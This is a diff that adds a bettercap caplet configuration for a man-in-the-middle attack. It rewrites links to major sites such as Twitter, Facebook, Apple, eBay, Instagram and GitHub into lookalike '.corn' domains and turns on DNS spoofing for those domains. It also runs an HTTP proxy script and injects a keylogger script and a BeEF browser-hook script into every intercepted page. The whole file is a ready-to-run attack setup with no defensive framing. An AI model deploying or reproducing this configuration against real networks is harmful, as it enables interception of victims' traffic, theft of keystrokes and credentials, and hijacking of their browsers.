@@ -1,0 +1,14 @@
+set drule.log             /usr/local/share/bettercap/caplets/drule/ssl.log
+set drule.ignore          *
+set drule.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,*.linkedin.com,linkedin.com,*.winzip.com,winzip.com,*.google.ie,google.ie,*.stackoverflow.com,stackoverflow.com,*.avg.com,avg.com,*.instagram.com,instagram.com,*.tiktok.com,tiktok.com,*.bbc.com,bbc.com,*.cnn.com,cnn.com,*.microsoft.com,microsoft.com,*.reddit.com,reddit.com,*.amazon.com,amazon.com,*.github.com,github.com,*.gitlab.com,gitlab.com
+set drule.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.linkedin.com,linkedin.com,*.winzip.com,winzip.com,*.google.ie,google.ie,*.stackoverflow.com,stackoverflow.com,*.avg.com,avg.com,*.instagram.corn,instagram.corn,*.tiktok.com,tiktok.com,*.bbc.com,bbc.com,*.cnn.com,cnn.com,*.microsoft.com,microsoft.com,*.reddit.com,reddit.com,*.amazon.com,amazon.com,*.github.corn,github.corn,*.gitlab.com,gitlab.com
+set drule.obfuscate       false
+set drule.encode          false
+set drule.payloads        *:/usr/local/share/bettercap/caplets/drule/payloads/keylogger.js,*:/root/Desktop/inject_beef.js 
+
+
+set http.proxy.script  /usr/local/share/bettercap/caplets/drule/drule.js
+set dns.spoof.domains  twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.linkedin.com,linkedin.com,*.winzip.com,winzip.com,*.google.ie,google.ie,*.stackoverflow.com,stackoverflow.com,*.avg.com,avg.com,*.instagram.corn,instagram.corn,*.tiktok.com,tiktok.com,*.bbc.com,bbc.com,*.cnn.com,cnn.com,*.microsoft.com,microsoft.com,*.reddit.com,reddit.com,*.amazon.com,amazon.com,*.github.corn,github.corn,*.gitlab.com,gitlab.com
+
+http.proxy  on
+dns.spoof   on
